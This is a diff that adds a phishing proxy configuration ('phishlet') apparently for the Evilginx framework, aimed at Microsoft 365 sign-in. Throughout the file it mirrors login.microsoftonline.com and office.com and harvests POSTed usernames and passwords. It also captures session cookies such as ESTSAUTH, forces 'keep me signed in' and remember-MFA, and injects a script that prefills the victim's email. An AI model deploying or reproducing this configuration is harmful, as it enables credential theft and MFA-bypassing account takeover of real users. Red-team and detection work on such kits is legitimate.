@@ -1,0 +1,75 @@
+name: 'm364'
+author: '@hazcod'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://www.office.com', replace: 'https://www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https%3A%2F%2Fwww.office.com', replace: 'https%3A%2F%2Fwww.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com', replace: 'https://login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', '.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', '.*,regexp']
+  - domain: '.office.com'
+    keys: ['.*,regexp']
+  - domain: 'www.office.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: '(login|UserName|username)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|password)'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/common/SAS/EndAuth'
+  - '/common/login'
+  - '/kmsi'
+  - '/landingv2'
+  - '/'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*"]
+    trigger_params: [email]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        if (emailId != null && "{email}" !== "") {
+          emailId.focus();
+          emailId.value = "{email}";
+        }
+      }
+      setTimeout(function(){ lp(); }, 1000);
